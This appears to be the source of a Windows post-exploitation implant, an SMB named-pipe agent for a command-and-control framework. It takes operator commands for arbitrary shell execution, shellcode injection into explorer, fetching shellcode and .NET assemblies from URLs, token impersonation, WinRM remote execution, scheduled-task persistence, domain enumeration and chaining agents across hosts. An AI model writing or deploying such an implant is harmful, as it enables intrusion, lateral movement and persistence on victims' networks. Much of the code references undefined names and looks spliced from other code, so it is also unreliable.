# smb_agent.py

import time
import logging
import subprocess
import os
from multiprocessing import Process, Pipe, freeze_support
import socket

import win32pipe
import win32file
import pywintypes
from utils.config import PIPENAME
from utils.file_operations import handle_download_command, handle_upload_command

if os.name == 'nt':  # 'nt' indicates Windows
    from multiprocessing import Pipe
    import pywintypes
    import win32pipe
    import win32file
    from utils.winapi.ls import ls
    from utils.winapi.list_users_in_group import list_users_in_group
    from utils.winapi.smb_get import smb_get
    from utils.winapi.smb_write import smb_write
    from utils.winapi.winrm_execute import winrm_execute
    from utils.winapi.pwd import wpwd
    from utils.winapi.wami import wami
    from utils.winapi.ps import list_processes, grep_processes, terminate_process
    from utils.winapi.run import run_process
    from utils.winapi.netexec import load_dotnet_assembly
    from utils.winapi.hostname import get_hostname 
    from utils.winapi.nslookup import nslookup
    from utils.winapi.mkdir import mkdir
    from utils.winapi.mv import mv
    from utils.winapi.cp import cp
    from utils.winapi.rm import rm
    from utils.winapi.inject_shellcode import load_shellcode_into_explorer
    from utils.winapi.load_shellcode_from_url import load_shellcode_from_url
    from utils.winapi.cd import cd
    from utils.winapi.ipinfo import get_ip_info
    from utils.winapi.make_token import make_token, revert_to_self
    from utils.winapi.get_ad_domain import get_ad_domain
    from utils.winapi.get_domain_controllers import get_domain_controllers
    from utils.winapi.get_logged_on_users import get_logged_on_users
    from utils.winapi.get_drive_info import get_drive_info
    from utils.winapi.get_installed_programs import get_installed_programs
    from utils.winapi.list_scheduled_tasks import list_scheduled_tasks
    from utils.winapi.create_scheduled_task import create_scheduled_task
    from utils.winapi.delete_scheduled_task import delete_scheduled_task
    from utils.winapi.get_scheduled_task_info import get_scheduled_task_info
    from utils.winapi.cat import cat
    from utils.winapi.start_scheduled_task import start_scheduled_task
    from utils.winapi.compress import compress_file

logging.basicConfig(level=logging.INFO)

def get_hostname():
    return socket.gethostname()

def handle_command(command):
    try:
        if command.startswith("ls"):
            path = command.split(' ', 1)[1]
            result = ls(path)
        elif command.startswith("users"):
            group_name = command.split(' ', 1)[1]
            result = list_users_in_group(group_name)
        elif command.startswith("getsmb"):
            parts = command.split()
            remote_file_path, local_file_path = parts[2], parts[3]
            result = smb_get(remote_file_path, local_file_path)
        elif command.startswith("writesmb"):
            parts = command.split()
            local_file_path, remote_smb_path = parts[2], parts[3]
            result = smb_write(local_file_path, remote_smb_path)
        elif command.startswith("winrmexec"):
            parts = command.split()
            remote_host, cmd = parts[1], parts[2]
            result = winrm_execute(remote_host, cmd)
        elif command.startswith("pwd"):
            result = wpwd()
        elif command == "whoami":
            result = wami()
        elif command.startswith("ps grep"):
            pattern = command.split(' ', 2)[2]
            result = grep_processes(pattern)
        elif command == "ps":
            result = list_processes()
        elif command.startswith("ps term"):
            process_id = int(command.split(' ', 2)[2])
            result = terminate_process(process_id)
        elif command.startswith("run"):
            executable_path = command.split(' ', 1)[1]
            result = run_process(executable_path)
        elif command.startswith("netexec"):
            parts = command.split(maxsplit=2)
            file_url, arguments = parts[1], parts[2]
            output, error = load_dotnet_assembly(file_url, arguments)
            result = output if not error else f"{output}\n{error}"
        elif command.startswith("download"):
            result, error = handle_download_command(command)
            result = result if not error else f"{result}\n{error}"
        elif command.startswith("upload"):
            result, error = handle_upload_command(command)
            result = result if not error else f"{result}\n{error}"
        elif command.startswith("hostname"):
            result = get_hostname()
        elif command.startswith("nslookup"):
            host_to_lookup = command.split(' ', 1)[1]
            result = nslookup(host_to_lookup)
        elif command.startswith("compress"):
            parts = command.split(' ', 1)
            file_path = parts[1]
            result = compress(file_path)
        elif command.startswith("mkdir"):
            parts = command.split(maxsplit=1)
            directory_path = parts[1]
            result = subprocess.check_output(f"mkdir {directory_path}", shell=True).decode('utf-8')
        elif os.name == 'nt' and command_text.lower() == 'get_dc_list':
            try:
                result = get_domain_controllers()
                status = 'Completed'
                output = "\n".join(result)
            except Exception as e:
                status = 'Failed'
                output = str(e)
            update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)
        elif os.name == 'nt' and command_text.lower().startswith('create_scheduled_task'):
            try:
                parts = shlex.split(command_text, posix=False)
                if len(parts) < 4 or len(parts) > 6:
                    raise ValueError("Invalid command format. Use 'create_scheduled_task <task_name> <command_line> <trigger_time> [repeat_interval] [repeat_duration]'")
                
                task_name = parts[1]
                command_line = parts[2].strip('"')
                trigger_time = parts[3]
                repeat_interval = parts[4] if len(parts) >= 5 else None
                repeat_duration = parts[5] if len(parts) == 6 else None
                
                result = create_scheduled_task(task_name, command_line, trigger_time, repeat_interval, repeat_duration)
                status = 'Completed'
                output = "\n".join(result)
            except Exception as e:
                status = 'Failed'
                output = str(e)
            update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

        elif os.name == 'nt' and command_text.lower().startswith('delete_scheduled_task'):
            try:
                parts = command_text.split(' ', 1)
                if len(parts) != 2:
                    raise ValueError("Invalid command format. Use 'delete_scheduled_task <task_name>'")
                _, task_name = parts
                result = delete_scheduled_task(task_name)
                status = 'Completed'
                output = "\n".join(result)
            except Exception as e:
                status = 'Failed'
                output = str(e)
            update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

        elif os.name == 'nt' and command_text.lower().startswith('get_scheduled_task_info'):
            try:
                parts = command_text.split(' ', 1)
                if len(parts) != 2:
                    raise ValueError("Invalid command format. Use 'get_scheduled_task_info <task_name>'")
                _, task_name = parts
                result = get_scheduled_task_info(task_name)
                status = 'Completed'
                output = "\n".join(result)
            except Exception as e:
                status = 'Failed'
                output = str(e)
            update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)
        elif os.name == 'nt' and command_text.lower().startswith('start_scheduled_task'):
            try:
                parts = command_text.split(' ', 1)
                if len(parts) != 2:
                    raise ValueError("Invalid command format. Use 'start_scheduled_task <task_name>'")
                _, task_name = parts
                result = start_scheduled_task(task_name)
                status = 'Completed'
                output = "\n".join(result)
            except Exception as e:
                status = 'Failed'
                output = str(e)
            update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

        elif os.name == 'nt' and command_text.lower() == 'list_scheduled_tasks':
            try:
                result = list_scheduled_tasks()
                status = 'Completed'
                output = "\n".join(result)
            except Exception as e:
                status = 'Failed'
                output = str(e)
            update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

        elif os.name == 'nt' and command_text.lower().startswith('cat'):
            try:
                file_path = command_text.split(' ', 1)[1]
                result = cat(file_path)
                status = 'Completed'
                output = result
            except Exception as e:
                status = 'Failed'
                output = str(e)
            update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

        elif os.name == 'nt' and command_text.lower() == 'get_logged_on_users':
            try:
                result = get_logged_on_users()
                status = 'Completed'
                output = "\n".join(result)
            except Exception as e:
                status = 'Failed'
                output = str(e)
            update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

        elif os.name == 'nt' and command_text.lower() == 'get_ad_domain':
            try:
                result = get_ad_domain()
                status = 'Completed'
                output = result
            except Exception as e:
                status = 'Failed'
                output = str(e)
            update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

        elif os.name == 'nt' and command_text.lower() == 'get_installed_programs':
            try:
                result = get_installed_programs()
                status = 'Completed'
                output = "\n".join(result)
            except Exception as e:
                status = 'Failed'
                output = str(e)
            update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

        elif os.name == 'nt' and command_text.lower() == 'get_drive_info':
            try:
                result = get_drive_info()
                status = 'Completed'
                output = "\n".join(result)
            except Exception as e:
                status = 'Failed'
                output = str(e)
            update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

        elif command.startswith("cd"):
            parts = command.split(maxsplit=1)
            directory_path = parts[1]
            os.chdir(directory_path)
            result = f"Changed directory to {directory_path}"
        elif os.name == 'nt' and command_text.lower().startswith('ipinfo'):
            try:
                result = get_ip_info()
                status = 'Completed'
                output = "\n".join([str(entry) for entry in result])  # Convert list of dicts to string
            except Exception as e:
                status = 'Failed'
                output = str(e)
            update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)
        elif command.startswith("rm"):
            parts = command.split(maxsplit=1)
            path = parts[1]
            result = subprocess.check_output(f"rm -rf {path}", shell=True).decode('utf-8')
        elif os.name == 'nt' and command_text.lower().startswith('execshellcode'):
            try:
                file_url = command_text.split(' ', 1)[1]
                result = load_shellcode_from_url(file_url)
                status = 'Completed'
                output = result
            except Exception as e:
                status = 'Failed'
                output = f"{str(e)}"
            update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

        elif os.name == 'nt' and command_text.lower().startswith('injectshellcode'):
            try:
                file_path = command_text.split(' ', 1)[1]
                result = load_shellcode_into_explorer(file_path)
                status = 'Completed'
                output = result
            except Exception as e:
                status = 'Failed'
                output = str(e)
            update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)
        elif command.startswith("cp"):
            parts = command.split(maxsplit=2)
            source, destination = parts[1], parts[2]
            result = subprocess.check_output(f"cp -r {source} {destination}", shell=True).decode('utf-8')
        elif command.startswith("mv"):
            parts = command.split(maxsplit=2)
            source, destination = parts[1], parts[2]
            result = subprocess.check_output(f"mv {source} {destination}", shell=True).decode('utf-8')
        elif command.startswith("make_token"):
            parts = command.split(maxsplit=3)
            username = parts[1]
            password = parts[2]
            domain = parts[3] if len(parts) == 4 else ''
            result = subprocess.check_output(f"make_token {username} {password} {domain}", shell=True).decode('utf-8')
        elif command == "revert_to_self":
            result = subprocess.check_output("revert_to_self", shell=True).decode('utf-8')
        elif command.startswith("link smb agent"):
            parts = command.split(maxsplit=6)
            ip_address = parts[3]
            if len(parts) == 4:
                result = subprocess.check_output(f"link smb agent {ip_address}", shell=True).decode('utf-8')
            elif len(parts) == 5:
                username = parts[4]
                result = subprocess.check_output(f"link smb agent {ip_address} {username}", shell=True).decode('utf-8')
            elif len(parts) == 6:
                username, password = parts[4], parts[5]
                result = subprocess.check_output(f"link smb agent {ip_address} {username} {password}", shell=True).decode('utf-8')
            elif len(parts) == 7:
                username, password, domain = parts[4], parts[5], parts[6]
                result = subprocess.check_output(f"link smb agent {ip_address} {username} {password} {domain}", shell=True).decode('utf-8')
        elif command.startswith("unlink smb agent"):
            parts = command.split(maxsplit=3)
            ip_address = parts[3]
            result = subprocess.check_output(f"unlink smb agent {ip_address}", shell=True).decode('utf-8')
        else:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8')

        if isinstance(result, list):
            result = "\n".join(result)
        return result
    except subprocess.CalledProcessError as e:
        return str(e)

def smb_agent(pipe_conn):
    while True:
        try:
            logging.info("Waiting for client to connect to the pipe...")
            handle = win32pipe.CreateNamedPipe(
                PIPENAME,
                win32pipe.PIPE_ACCESS_DUPLEX,
                win32pipe.PIPE_TYPE_MESSAGE | win32pipe.PIPE_WAIT,
                1, 65536, 65536,
                0,
                None
            )

            win32pipe.ConnectNamedPipe(handle, None)
            logging.info("Client connected to the pipe.")

            while True:
                try:
                    resp = win32file.ReadFile(handle, 64*1024)
                    command = resp[1].decode('utf-8').strip()
                    logging.info(f"Received command: {command}")

                    if command.lower() == 'disconnect':
                        logging.info("Disconnect command received.")
                        win32file.CloseHandle(handle)
                        break

                    if command.lower().startswith('connect'):
                        logging.info(f"Handling connect command with details: {command}")
                        parts = command.split()
                        if len(parts) > 1:
                            username = parts[1]
                        if len(parts) > 2:
                            password = parts[2]
                        if len(parts) > 3:
                            domain = parts[3]
                        continue

                    result = handle_command(command)
                    hostname = get_hostname()
                    response = f"{hostname}\n{result}"  # Include hostname in the response
                    win32file.WriteFile(handle, response.encode('utf-8'))
                except pywintypes.error as e:
                    logging.error(f"Pipe read/write error: {e}")
                    break
        except pywintypes.error as e:
            logging.error(f"Pipe creation error: {e}")

if __name__ == "__main__":
    freeze_support()  # Add this line
    parent_conn, child_conn = Pipe()
    p = Process(target=smb_agent, args=(child_conn,))
    p.start()
    while True:
        if parent_conn.poll():
            command = parent_conn.recv()
            if command == 'terminate':
                p.terminate()
                p.join()
                break
        time.sleep(1)
